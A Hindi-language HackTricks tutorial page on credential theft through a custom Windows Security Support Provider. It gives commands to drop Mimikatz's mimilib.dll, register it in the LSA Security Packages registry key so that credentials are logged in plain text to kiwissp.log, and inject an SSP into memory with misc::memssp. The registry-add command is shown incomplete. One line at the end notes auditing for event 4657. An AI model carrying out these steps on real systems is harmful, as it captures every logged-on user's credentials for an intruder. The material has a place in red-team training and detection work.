<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह में शामिल हों**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>


# कस्टम SSP

[यहाँ जानें कि SSP (सिक्योरिटी सपोर्ट प्रोवाइडर) क्या है.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
आप अपना **खुद का SSP बना सकते हैं** ताकि मशीन तक पहुँचने के लिए इस्तेमाल किए गए **क्रेडेंशियल्स को स्पष्ट पाठ में कैप्चर कर सकें.**

### Mimilib

आप Mimikatz द्वारा प्रदान की गई `mimilib.dll` बाइनरी का उपयोग कर सकते हैं. **यह सभी क्रेडेंशियल्स को स्पष्ट पाठ में एक फाइल में लॉग करेगा.**\
डीएलएल को `C:\Windows\System32\` में ड्रॉप करें\
मौजूदा LSA सिक्योरिटी पैकेजेस की सूची प्राप्त करें:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

`mimilib.dll` को सुरक्षा समर्थन प्रदाता सूची (Security Packages) में जोड़ें:
```csharp
PS C:\> reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
और एक रिबूट के बाद सभी क्रेडेंशियल्स स्पष्ट पाठ में `C:\Windows\System32\kiwissp.log` में पाए जा सकते हैं

### मेमोरी में

आप इसे सीधे मेमोरी में Mimikatz का उपयोग करके इंजेक्ट भी कर सकते हैं (ध्यान दें कि यह थोड़ा अस्थिर/काम न करने वाला हो सकता है):
```csharp
privilege::debug
misc::memssp
```
यह रिबूट्स के बाद नहीं बचेगा।

## उपाय

इवेंट आईडी 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` के निर्माण/परिवर्तन की ऑडिट करें


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर **मुझे फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>
